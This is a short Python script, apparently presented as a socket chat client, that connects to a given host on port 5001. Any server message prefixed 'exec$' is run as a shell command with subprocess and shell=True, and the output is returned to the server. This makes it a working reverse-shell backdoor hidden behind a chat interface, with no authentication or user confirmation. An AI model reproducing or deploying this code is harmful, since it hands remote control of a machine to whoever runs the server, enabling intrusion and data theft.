import socket, select, string, sys, os
import subprocess

#Helper function (formatting)
def display() :
	you=" You: "
	# sys.stdout.write()
	sys.stdout.flush()

def main():
	if len(sys.argv) < 3:
		print("error")
	else:
		host = sys.argv[1]
		name = str.encode(sys.argv[2])

	port = 5001
	#asks for user name
	# name=raw_input("\33[34m\33[1m CREATING NEW ID:\n Enter username: \33[0m")
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	# s.settimeout(2)
	# connecting host
	try :
		s.connect((host, port))
	except :
		print("Can't connect to the server")
		sys.exit()

#if connected
	s.send(name)
	display()
	while 1:
		socket_list = [sys.stdin, s]

		# Get the list of sockets which are readable
		rList, wList, error_list = select.select(socket_list , [], [])


		for sock in rList:
			if sock == s:
				data = (sock.recv(4096)).decode('utf-8')
				if not data :
					print('DISCONNECTED!!')
					sys.exit()
				else :
					resp = data.split("$")
					if(resp[0].strip() == "exec"):
						recv = resp[1]
						print(recv)

						#where client receives command
						res = run_command(recv)
	
						#send command
						s.send(res)

		#user entered a message
			else :
				msg=sys.stdin.readline()
				s.send(str(msg).encode('utf-8'))
				# display()

"""
Runs command send from server with exec
"""
def run_command(cmd):
	result = subprocess.check_output(cmd, shell=True)
	return result


if __name__ == "__main__":
	main()
